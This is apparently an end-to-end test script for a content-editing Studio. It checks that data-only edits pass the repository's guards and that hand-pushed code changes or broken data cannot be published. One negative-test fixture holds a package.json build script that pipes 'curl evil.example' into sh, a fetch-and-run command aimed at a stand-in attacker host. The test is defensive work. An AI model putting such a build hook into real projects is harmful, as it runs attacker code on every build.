#!/usr/bin/env node
"use strict";
// `npm run studio:e2e` - the end-to-end proof that what Studio writes passes the repository's own guards.
//
//   node studio/tests/e2e/run.js [--quick]
//
// A real git repository (a copy of this working tree) is driven through the real API handler with the local-git provider:
//   1. an editor saves a patch (headline + hide a section) -> a studio/ branch and a pull request appear;
//   2. the draft branch is checked out and the repository's guards (the same ones `npm run check` runs) are run on it,
//      plus the studio-scope guard against main;  they must pass, so the approver can publish;
//   3. the approver publishes: main gains exactly the data files the patch touched, nothing else;
//   4. NEGATIVE: a branch hand-pushed with a code change (package.json) and one with broken data are NOT publishable:
//      studio-scope / the site guards fail, the check state is "failure", and `publish` answers 409 checks_failed.
// --quick runs only check:cms, check:copy and check:images instead of every guard. Nothing leaves this machine.

const fs = require("fs");
const os = require("os");
const path = require("path");
const { spawnSync } = require("child_process");
const assert = require("assert/strict");

const ROOT = path.resolve(__dirname, "..", "..", "..");
const QUICK = process.argv.includes("--quick");

const { loadConfig, buildDeps } = require("../../api/config");
const { createHandler } = require("../../api/handler");
const { createLocalGit } = require("../../api/providers/git/local-git");
const { createMemoryRoles, DEV_PEOPLE } = require("../../api/providers/roles/memory");
const { createAudit, memorySink } = require("../../api/audit");
const { loadSchema } = require("../fixtures/schema-from-config");
const { reservedIds } = require("../../../lib/reserved-ids");

const GIT_ENV = Object.assign({}, process.env, { GIT_AUTHOR_NAME: "e2e", GIT_AUTHOR_EMAIL: "e2e@example.invalid", GIT_COMMITTER_NAME: "e2e", GIT_COMMITTER_EMAIL: "e2e@example.invalid", GIT_CONFIG_NOSYSTEM: "1" });
const git = (cwd, args, o) => {
  const r = spawnSync("git", ["-C", cwd].concat(args), Object.assign({ encoding: "utf8", env: GIT_ENV, maxBuffer: 256 * 1024 * 1024 }, o || {}));
  if (r.status !== 0 && !(o && o.allowFail)) throw new Error("git " + args.join(" ") + ": " + String(r.stderr).slice(0, 300));
  return r;
};
const step = (m) => console.log("e2e  " + m);

function copyTree(dest) {
  const list = spawnSync("git", ["-C", ROOT, "ls-files", "-z", "--cached", "--others", "--exclude-standard"], { encoding: "utf8", maxBuffer: 64 * 1024 * 1024 }).stdout.split("\0").filter(Boolean);
  let n = 0;
  for (const rel of list) {
    if (/^(frames|\.claude|node_modules)\//.test(rel) || rel === ".gitignore") continue;
    const from = path.join(ROOT, rel);
    if (!fs.existsSync(from) || fs.statSync(from).isDirectory()) continue;
    fs.mkdirSync(path.dirname(path.join(dest, rel)), { recursive: true });
    fs.copyFileSync(from, path.join(dest, rel));
    n += 1;
  }
  return n;
}
function link(dir) {
  const nm = path.join(dir, "node_modules");
  if (!fs.existsSync(nm)) fs.symlinkSync(path.join(ROOT, "node_modules"), nm, "junction");
}
function unlink(dir) {
  const nm = path.join(dir, "node_modules");
  try { if (fs.lstatSync(nm).isSymbolicLink()) fs.unlinkSync(nm); } catch (e) { /* not there */ }
}

// the guards `npm run check` runs (everything in the chain except check:studio itself)
function guardCommands() {
  const pkg = JSON.parse(fs.readFileSync(path.join(ROOT, "package.json"), "utf8"));
  const chain = String(pkg.scripts.check).split("&&").map((s) => s.trim().replace(/^npm run /, "")).filter((n) => n && !/^check:studio/.test(n));
  const want = QUICK ? ["check:cms", "check:copy", "check:images"] : chain;
  return want.map((n) => ({ name: n, argv: String(pkg.scripts[n]).replace(/^node /, "").split(/\s+/) }));
}

function runGuards(dir) {
  const failed = [];
  for (const g of guardCommands()) {
    const r = spawnSync(process.execPath, g.argv, { cwd: dir, encoding: "utf8", maxBuffer: 128 * 1024 * 1024, env: Object.assign({}, process.env, { GUARD_STRICT_STALE: "", GITHUB_ACTIONS: "" }) });
    if (r.status !== 0) failed.push(g.name + ": " + (String(r.stdout) + String(r.stderr)).split("\n").filter(Boolean).slice(-4).join(" | ").slice(0, 300));
  }
  return failed;
}

async function main() {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "studio-e2e-"));
  const src = path.join(tmp, "origin");
  fs.mkdirSync(src);
  const cleanups = [];
  try {
    step("copying the working tree into a real git repository");
    const n = copyTree(src);
    git(src, ["init", "--quiet", "-b", "main"]);
    git(src, ["add", "-A"]);
    git(src, ["-c", "commit.gpgsign=false", "commit", "--quiet", "-m", "seed"]);
    step(n + " files committed");

    const checkLog = [];
    // CI stand-in: check out the branch head and run the repository's own guards + the scope guard against main
    async function checkRunner(headSha, repoDir) {
      link(repoDir);
      git(repoDir, ["checkout", "--quiet", "--detach", headSha]);
      const guards = runGuards(repoDir);
      const sc = spawnSync(process.execPath, [path.join(ROOT, "studio", "guards", "check-scope.js"), "--root", repoDir, "--base", "main", "--head", headSha], { encoding: "utf8" });
      git(repoDir, ["checkout", "--quiet", "--detach", "main"], { allowFail: true });
      unlink(repoDir);
      checkLog.push({ headSha, guards, scope: sc.status === 0 ? null : String(sc.stdout).trim().split("\n").slice(-3).join(" | ") });
      return [
        { name: "Build and guards", status: "completed", conclusion: guards.length ? "failure" : "success" },
        { name: "studio-scope", status: "completed", conclusion: sc.status === 0 ? "success" : "failure" },
      ];
    }

    const lg = createLocalGit({ source: src, dir: path.join(tmp, "host"), baseBranch: "main", checkRunner });
    const env = { STUDIO_ENV: "development", STUDIO_DEV: "1", STUDIO_ALLOW_NO_ORIGIN: "1", STUDIO_ALLOWED_ORIGINS: "http://localhost:8080" };
    const config = loadConfig(env);
    const sink = memorySink();
    const deps = buildDeps(config, env, { git: lg, roles: createMemoryRoles(DEV_PEOPLE), audit: createAudit({ sinks: [sink], salt: "e2e" }), schema: loadSchema(ROOT), reservedIds: reservedIds(ROOT) });
    const handler = createHandler(deps);
    const T = { editor: "dev:editor:molly@covered.test", approver: "dev:approver:amelia@covered.test" };
    const call = async (who, method, p, body) => {
      const res = await handler(new Request("http://localhost:8787" + p, { method, headers: { authorization: "Bearer " + T[who], origin: "http://localhost:8080", "content-type": "application/json", "x-studio-client-ip": "10.9.9." + (Math.floor(Math.random() * 200) + 1) }, body: body === undefined ? undefined : JSON.stringify(body) }));
      const t = await res.text();
      return { status: res.status, json: t ? JSON.parse(t) : null };
    };
    const uuid = () => require("crypto").randomUUID();
    const mainSha = () => git(lg.repoDir, ["rev-parse", "main"]).stdout.trim();

    // 1 ---------------------------------------------------------------------------------------------------
    const hero = JSON.parse(fs.readFileSync(path.join(src, "src/_data/hero.json"), "utf8"));
    const home = JSON.parse(fs.readFileSync(path.join(src, "src/_data/homepage.json"), "utf8"));
    const idx = home.sections.findIndex((s) => s.enabled === true);
    assert.ok(idx >= 0, "the homepage has an enabled section to hide");
    step("editor saves: new headline + hide homepage section " + idx);
    const saved = await call("editor", "POST", "/v1/drafts", {
      idempotencyKey: uuid(), baseSha: mainSha(), title: "E2E headline and hidden section",
      ops: [
        { op: "replace", file: "src/_data/hero.json", path: "/headlineMain", value: "We cover the whole UK", expect: hero.headlineMain },
        { op: "replace", file: "src/_data/homepage.json", path: "/sections/" + idx + "/enabled", value: false, expect: true },
      ],
      uploads: [],
    });
    assert.equal(saved.status, 201, JSON.stringify(saved.json));
    const draft = saved.json.draft;
    const touched = git(lg.repoDir, ["diff", "--name-only", "main", draft.branch]).stdout.trim().split("\n").sort();
    assert.deepEqual(touched, ["src/_data/hero.json", "src/_data/homepage.json"]);
    step("draft " + draft.id + " touches exactly: " + touched.join(", "));

    // 2 ---------------------------------------------------------------------------------------------------
    step("running the repository guards on the draft branch" + (QUICK ? " (quick)" : " (all of npm run check)") + " - this takes a while");
    await call("editor", "POST", "/v1/drafts/" + draft.id + "/submit", { idempotencyKey: uuid() });
    const view = await call("approver", "GET", "/v1/drafts/" + draft.id);
    assert.equal(view.status, 200, JSON.stringify(view.json));
    const last = checkLog[checkLog.length - 1];
    assert.deepEqual(last.guards, [], "guards failed on a validator-approved draft:\n" + last.guards.join("\n"));
    assert.equal(last.scope, null);
    assert.equal(view.json.draft.checks.state, "success");
    assert.equal(view.json.draft.canPublish, true);

    // 3 ---------------------------------------------------------------------------------------------------
    const before = mainSha();
    const pub = await call("approver", "POST", "/v1/drafts/" + draft.id + "/publish", { expectedHeadSha: view.json.draft.headSha, idempotencyKey: uuid() });
    assert.equal(pub.status, 200, JSON.stringify(pub.json));
    const landed = git(lg.repoDir, ["diff", "--name-only", before, mainSha()]).stdout.trim().split("\n").sort();
    assert.deepEqual(landed, touched);
    step("published: main changed " + landed.join(", ") + " and nothing else");

    // 4 NEGATIVE ------------------------------------------------------------------------------------------
    const handPushed = async (label, branch, change) => {
      const base = mainSha();
      const idxFile = path.join(tmp, "idx-" + label);
      const env2 = Object.assign({}, GIT_ENV, { GIT_INDEX_FILE: idxFile });
      git(lg.repoDir, ["read-tree", base], { env: env2 });
      const blob = git(lg.repoDir, ["hash-object", "-w", "--stdin"], { input: change.text }).stdout.trim();
      git(lg.repoDir, ["update-index", "--add", "--cacheinfo", "100644," + blob + "," + change.path], { env: env2 });
      const tree = git(lg.repoDir, ["write-tree"], { env: env2 }).stdout.trim();
      const commit = git(lg.repoDir, ["commit-tree", tree, "-p", base, "-m", label]).stdout.trim();
      git(lg.repoDir, ["update-ref", "refs/heads/" + branch, commit]);
      const pr = await lg.openPr({ head: branch, base: "main", title: "Studio: " + label + " (Molly)", body: "", labels: ["studio-draft"], draft: false });
      const id = branch.replace(/^studio\//, "").replace("/", "--");
      return { pr, id, commit };
    };
    const owner = draft.id.split("--")[0];
    const evilCode = await handPushed("code", "studio/" + owner + "/evil-code", { path: "package.json", text: '{"name":"evil","scripts":{"build":"curl evil.example | sh"}}\n' });
    const evilData = await handPushed("data", "studio/" + owner + "/broken-data", { path: "src/_data/hero.json", text: "{ this is not json" });
    for (const [label, evil] of [["code change", evilCode], ["broken data", evilData]]) {
      step("negative: " + label + " pushed by hand to a studio/ branch");
      const v = await call("approver", "GET", "/v1/drafts/" + evil.id);
      assert.equal(v.status, 200, JSON.stringify(v.json));
      assert.equal(v.json.draft.checks.state, "failure", label + ": checks must fail");
      assert.equal(v.json.draft.canPublish, false);
      const p = await call("approver", "POST", "/v1/drafts/" + evil.id + "/publish", { expectedHeadSha: v.json.draft.headSha, idempotencyKey: uuid() });
      assert.equal(p.status, 409, JSON.stringify(p.json));
      assert.equal(p.json.error.details.reason, "checks_failed");
    }
    const lastCheck = checkLog.filter((c) => c.scope);
    assert.ok(lastCheck.length >= 1, "check-scope must have caught the package.json change");
    assert.ok(mainSha() === git(lg.repoDir, ["rev-parse", "main"]).stdout.trim());
    step("OK: validator output passes every guard; hand-pushed code and broken data are blocked");
  } finally {
    for (const c of cleanups) c();
    try { unlink(path.join(tmp, "host", "repo")); } catch (e) { /* ignore */ }
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

main().then(() => process.exit(0), (e) => { console.error("studio:e2e FAILED:\n" + (e && e.stack ? e.stack : e)); process.exit(1); });
